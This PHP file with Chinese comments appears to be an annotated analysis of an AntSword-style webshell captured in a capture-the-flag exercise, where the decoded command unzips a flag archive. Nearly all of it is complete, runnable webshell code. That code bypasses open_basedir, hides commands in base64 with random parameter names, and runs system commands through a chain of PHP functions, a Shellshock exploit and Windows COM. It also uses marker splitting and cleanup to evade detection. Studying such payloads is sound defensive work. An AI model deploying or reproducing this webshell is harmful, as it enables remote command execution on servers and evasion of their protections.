<?php
/**
 * ============================================================================
 * 【WebShell 后门分析】—— 蚁剑(AntSword)/冰蝎(Behinder) 类型的一句话木马
 * ============================================================================
 * 
 * 这是一个典型的 PHP WebShell 后门程序，攻击者通过 Web 浏览器或专用客户端
 * 连接此文件，向目标服务器发送经过编码的系统命令，实现远程命令执行（RCE）。
 * 
 * 【攻击链路】
 *   攻击者客户端 → HTTP请求(POST/GET) → 此WebShell → 执行系统命令 → 返回结果
 * 
 * 【关键特征】
 *   1. 绕过 open_basedir 安全限制
 *   2. Base64 编码隐藏真实命令
 *   3. 使用输出标记（如 2b26183 / be8dd7）作为数据边界，供客户端解析
 *   4. 按优先级尝试多种命令执行函数
 *   5. 包含 Shellshock (CVE-2014-6271) 漏洞利用作为后备方案
 * 
 * 【本次执行的实际命令解码】
 *   $p = "/bin/sh"（Linux shell 解释器）
 *   $s = cd "/home/kali/桌面";unzip -P P@ssw03d -o flag.zip;echo 297abd50d1;pwd;echo f0809
 *   即：进入目录 → 用密码解压 flag.zip → 输出标识哈希 → 显示当前目录 → 输出结束标记
 * ============================================================================
 */

// ======================== 第一部分：环境初始化 ========================

// 关闭错误显示，防止错误信息暴露 WebShell 存在
//a = @ini_set("display_errors", "0");  // 被注释掉了，可能是调试用途

// 设置脚本无执行时间限制，确保长时间命令也能执行完毕
@set_time_limit(0);

// ======================== 第二部分：绕过 open_basedir 限制 ========================
/**
 * 【open_basedir 绕过原理】
 * 
 * open_basedir 是 PHP 的安全配置，限制 PHP 只能访问指定目录下的文件。
 * 这段代码利用了一个已知的 PHP 漏洞技巧来绕过这个限制：
 * 
 * 1. 在允许的目录下创建临时子目录 `.22f56`
 * 2. chdir 进入该子目录
 * 3. 用 ini_set("open_basedir", "..") 将限制设为上级目录
 * 4. 通过多次 chdir("..") 回退到根目录
 * 5. 再次 ini_set("open_basedir", "/") 将限制扩展到整个文件系统
 * 
 * 结果：原本只能访问受限目录，现在可以访问服务器上的任意文件
 */
$opdir = @ini_get("open_basedir");  // 获取当前 open_basedir 配置
if ($opdir) {
    // 如果设置了 open_basedir，执行绕过操作
    $ocwd = dirname($_SERVER["SCRIPT_FILENAME"]);  // 获取脚本所在目录

    // 按分号或冒号分割 open_basedir 路径（Linux用:，Windows用;）
    $oparr = preg_split("/;|:/", $opdir);

    // 将当前目录和临时目录也加入可写目录列表
    @array_push($oparr, $ocwd, sys_get_temp_dir());

    // 遍历所有可访问目录，寻找一个可写的位置
    foreach ($oparr as $item) {
        if (!@is_writable($item)) {
            continue;  // 跳过不可写的目录
        };

        $tmdir = $item . "/.22f56";  // 创建隐藏的临时目录（以.开头）
        @mkdir($tmdir);

        if (!@file_exists($tmdir)) {
            continue;  // 目录创建失败则跳过
        }

        @chdir($tmdir);  // 进入临时目录

        // 关键步骤：将 open_basedir 设置为 ".."，利用 PHP 漏洞特性
        @ini_set("open_basedir", "..");

        // 计算当前目录的层级深度（按路径分隔符分割）
        $cntarr = @preg_split("/\\\\|\//", $tmdir);

        // 逐层向上回退，突破 open_basedir 限制
        for ($i = 0; $i < sizeof($cntarr); $i++) {
            @chdir("..");
        };

        // 将 open_basedir 设置为根目录，完全解除文件系统访问限制
        @ini_set("open_basedir", "/");

        // 清理痕迹：删除临时目录
        @rmdir($tmdir);
        break;  // 绕过成功，退出循环
    };
};;

// ======================== 第三部分：输出处理函数 ========================

/**
 * 【输出编码函数】
 * 原始版本直接返回输出，但经过改造后可对输出进行加密/编码，
 * 防止 WAF（Web应用防火墙）或 IDS（入侵检测系统）识别敏感内容
 */
function asenc($out)
{
    return $out;  // 当前无编码，直接返回
};

/**
 * 【输出包装函数】
 * 使用输出缓冲区（ob）捕获所有 echo/print 输出，
 * 然后在前后加上特定标记字符串，供 WebShell 客户端识别和提取结果
 * 
 * 标记格式：2b26183 + [命令执行结果] + be8dd7
 * 客户端通过正则匹配这两个标记来提取命令输出
 */
function asoutput()
{
    $output = ob_get_contents();  // 获取缓冲区中的所有输出
    ob_end_clean();               // 清空并关闭输出缓冲区

    // 输出起始标记（分两段拼接，可能是为了绕过静态检测）
    echo "2b2" . "6183";

    // 输出命令执行结果（可能经过加密）
    echo @asenc($output);

    // 输出结束标记
    echo "be8" . "dd7";
}

// 开启输出缓冲区，后续所有输出都被捕获到缓冲区中
ob_start();

// ======================== 第四部分：命令解码与构建 ========================

try {
    /**
     * 【Base64 编码的命令】
     * 攻击者将真实的系统命令用 Base64 编码后写入代码中，
     * 目的是：
     *   1. 隐藏真实意图，绕过基于关键词的检测（如 grep "rm"）
     *   2. 避免特殊字符引起语法错误
     *   3. substr(..., 2) 跳过前2个字符（可能是随机填充，增加混淆）
     */

    // 解码 shell 路径："/bin/sh"（Linux 的默认 shell）
    $p = base64_decode(substr("OWL2Jpbi9zaA%3D%3D", 2));

    // 解码要执行的系统命令
    // 解码结果：cd "/home/kali/桌面";unzip -P P@ssw03d -o flag.zip;echo 297abd50d1;pwd;echo f0809
    // 含义：进入目录 → 用密码 P@ssw03d 解压 flag.zip → 输出标识 → 显示当前路径 → 输出结束标识
    $s = base64_decode(substr("BPY2QgIi9ob21lL2thbGkv5qGM6Z2iIjt1bnppcCAgLVAgUEBzU3cwM2QgLW8gZmxhZy56aXA7ZWNobyAyOTdhYmQ1MGQxO3B3ZDtlY2hvIGYwODA5", 2));

    // 解码环境变量字符串（当前为空，可能用于传递额外环境配置）
    $envstr = @base64_decode(substr("VJ", 2));

    // 调试输出（可能用于确认解码正确）
    echo $p;
    echo $s;
    echo $envstr;

    // ======================== 第五部分：操作系统识别与环境配置 ========================

    // 获取脚本所在目录，用于判断操作系统类型
    $d = dirname($_SERVER["SCRIPT_FILENAME"]);

    /**
     * 【操作系统判断逻辑】
     * Linux 路径以 "/" 开头 → 使用 shell 的 "-c" 参数
     * Windows 路径以盘符开头（如 "C:"）→ 使用 cmd 的 "/c" 参数
     */
    $c = substr($d, 0, 1) == "/" ? "-c \"{$s}\"" : "/c \"{$s}\"";

    // 根据操作系统类型设置 PATH 环境变量，确保能找到系统命令
    if (substr($d, 0, 1) == "/") {
        // Linux：追加常用系统命令路径
        @putenv("PATH=" . getenv("PATH") . ":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
    } else {
        // Windows：追加系统目录和 PowerShell 路径
        @putenv("PATH=" . getenv("PATH") . ";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");
    }

    // 处理额外的环境变量（由客户端通过请求传递）
    if (!empty($envstr)) {
        // 以 "|||asline|||" 分隔多个环境变量
        $envarr = explode("|||asline|||", $envstr);
        foreach ($envarr as $v) {
            if (!empty($v)) {
                // 以 "|||askey|||" 代替 "=" 分隔 key 和 value，避免编码问题
                @putenv(str_replace("|||askey|||", "=", $v));
            }
        }
    }

    // 构建完整的执行命令，如：/bin/sh -c "cd ...;unzip ...;pwd"
    $r = "{$p} {$c}";

    // ======================== 第六部分：辅助函数 ========================

    /**
     * 【函数可用性检测】
     * 检查指定的 PHP 函数是否：
     *   1. 存在（function_exists）
     *   2. 可调用（is_callable）
     *   3. 未被 disable_functions 禁用
     * 
     * 服务器管理员可能在 php.ini 中禁用危险函数，WebShell 需要逐个检测
     */
    function fe($f)
    {
        // 获取被禁用的函数列表（php.ini 中的 disable_functions 配置）
        $d = explode(",", @ini_get("disable_functions"));
        if (empty($d)) {
            $d = array();
        } else {
            // 统一转为小写，便于比较
            $d = array_map('trim', array_map('strtolower', $d));
        }
        return (function_exists($f) && is_callable($f) && !in_array($f, $d));
    };

    /**
     * 【Shellshock 漏洞利用】（CVE-2014-6271）
     * 
     * 当所有常规命令执行函数都被禁用时，尝试利用 Bash 的 Shellshock 漏洞：
     * 
     * 原理：Bash 在处理环境变量中的函数定义时存在漏洞，
     *        可以在函数定义后附加任意命令，这些命令会被执行。
     * 
     * 利用方式：
     *   1. 设置环境变量：PHP_LOL=() { x; }; 要执行的命令
     *   2. 触发一个调用 shell 的操作（error_log 或 mail）
     *   3. Bash 解析环境变量时会执行附加的命令
     * 
     * 前提条件：
     *   - Linux 系统（路径以 / 开头）
     *   - /bin/sh 指向 bash
     *   - putenv 和 error_log/mail 函数可用
     */
    function runshellshock($d, $c)
    {
        if (substr($d, 0, 1) == "/" && fe('putenv') && (fe('error_log') || fe('mail'))) {
            // 检查 /bin/sh 是否为 bash（只有 bash 有此漏洞）
            if (strstr(readlink("/bin/sh"), "bash") != FALSE) {
                $tmp = tempnam(sys_get_temp_dir(), 'as');  // 创建临时文件存储输出

                // 构造恶意环境变量，利用 Shellshock 漏洞执行命令
                putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");

                // 触发 shell 调用，使 bash 解析恶意环境变量
                if (fe('error_log')) {
                    error_log("a", 1);  // error_log 发送邮件时会调用 shell
                } else {
                    mail("a@127.0.0.1", "", "", "-bv");  // mail 函数也会调用 shell
                }
            } else {
                return False;
            }

            // 读取命令执行结果
            $output = @file_get_contents($tmp);
            @unlink($tmp);  // 删除临时文件，清理痕迹

            if ($output != "") {
                print($output);
                return True;
            }
        }
        return False;
    };

    /**
     * 【多策略命令执行函数】
     * 按优先级依次尝试以下命令执行方法：
     * 
     * 优先级    函数           说明
     * ───────────────────────────────────────────────────
     *  1       system()       直接执行命令并输出
     *  2       passthru()     执行命令并直接输出原始结果
     *  3       shell_exec()   通过 shell 执行命令
     *  4       exec()         执行命令，返回最后一行输出
     *  5       popen()        打开进程管道读取输出
     *  6       proc_open()    高级进程控制，可同时读取 stdout 和 stderr
     *  7       Shellshock     利用 Bash 漏洞执行命令（仅 Linux）
     *  8       COM 对象       Windows 下使用 WScript.shell 执行命令
     * 
     * 这种设计确保即使管理员禁用了部分函数，WebShell 仍可能找到可用的执行方式
     */
    function runcmd($c)
    {
        $ret = 0;
        $d = dirname($_SERVER["SCRIPT_FILENAME"]);

        // 策略1：system() - 最直接的方式
        if (fe('system')) {
            @system($c, $ret);

        // 策略2：passthru() - 直接输出原始二进制结果
        } elseif (fe('passthru')) {
            @passthru($c, $ret);

        // 策略3：shell_exec() - 通过反引号或 shell 执行
        } elseif (fe('shell_exec')) {
            print(@shell_exec($c));

        // 策略4：exec() - 不直接输出，需要手动拼接
        } elseif (fe('exec')) {
            @exec($c, $o, $ret);
            print(join("
", $o));

        // 策略5：popen() - 打开进程文件指针
        } elseif (fe('popen')) {
            $fp = @popen($c, 'r');
            while (!@feof($fp)) {
                print(@fgets($fp, 2048));
            }
            @pclose($fp);

        // 策略6：proc_open() - 最灵活的进程控制
        } elseif (fe('proc_open')) {
            // 创建进程，stdout(1) 和 stderr(2) 都通过管道读取
            $p = @proc_open($c, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);
            while (!@feof($io[1])) {
                print(@fgets($io[1], 2048));  // 读取标准输出
            }
            while (!@feof($io[2])) {
                print(@fgets($io[2], 2048));  // 读取标准错误
            }
            @fclose($io[1]);
            @fclose($io[2]);
            @proc_close($p);

        // 策略7：antsystem（已注释，可能是自定义扩展）
        } elseif (fe('antsystem')) {
            // @antsystem($c);

        // 策略8：Shellshock 漏洞利用（仅 Linux）
        } elseif (runshellshock($d, $c)) {
            return $ret;

        // 策略9：Windows COM 对象（仅 Windows）
        } elseif (substr($d, 0, 1) != "/" && @class_exists("COM")) {
            // 使用 Windows 脚本宿主执行命令
            $w = new COM('WScript.shell');
            $e = $w->exec($c);
            $so = $e->StdOut();       // 获取标准输出流
            $ret .= $so->ReadAll();   // 读取所有输出
            $se = $e->StdErr();       // 获取标准错误流
            $ret .= $se->ReadAll();   // 读取所有错误输出
            print($ret);

        // 所有策略都失败
        } else {
            $ret = 127;  // 返回 127 表示"命令未找到"（类似 shell 的标准错误码）
        }
        return $ret;
    };

    // ======================== 第七部分：执行命令并输出结果 ========================

    // 执行命令，将 stderr(2) 重定向到 stdout(1)，确保错误信息也能被捕获
    $ret = @runcmd($r . " 2>&1");

    // 如果返回值非0（执行失败），输出错误码供客户端判断
    print ($ret != 0) ? "ret={$ret}" : "";

} catch (Exception $e) {
    // 异常处理：输出错误信息，方便攻击者调试
    echo "ERROR://" . $e->getMessage();
};

// 调用输出函数，将缓冲区中的结果加上标记后发送给客户端
asoutput();

// 终止脚本执行
die();

// ======================== 第八部分：攻击载荷参数（供客户端使用） ========================
/**
 * 这些是 GET/POST 请求参数，由 WebShell 客户端发送：
 * 
 * 参数 paf2bc7ed125d1 = VJ    → 环境变量（当前为空，base64解码后为空字符串）
 * 参数 x77118dbf56718 = BPY2...→ 要执行的系统命令（Base64编码）
 * 参数 ya7bc128230026 = OWL2...→ Shell路径 "/bin/sh"（Base64编码）
 * 
 * 参数名使用随机字符串，目的是：
 *   1. 避免被 WAF 基于参数名的规则拦截
 *   2. 每个 WebShell 实例使用不同的参数名，增加检测难度
 *   3. 混淆流量分析，看起来像随机数据
 */
//&paf2bc7ed125d1=VJ&x77118dbf56718=BPY2QgIi9ob21lL2thbGkv5qGM6Z2iIjt1bnppcCAgLVAgUEBzU3cwM2QgLW8gZmxhZy56aXA7ZWNobyAyOTdhYmQ1MGQxO3B3ZDtlY2hvIGYwODA5&ya7bc128230026=OWL2Jpbi9zaA==
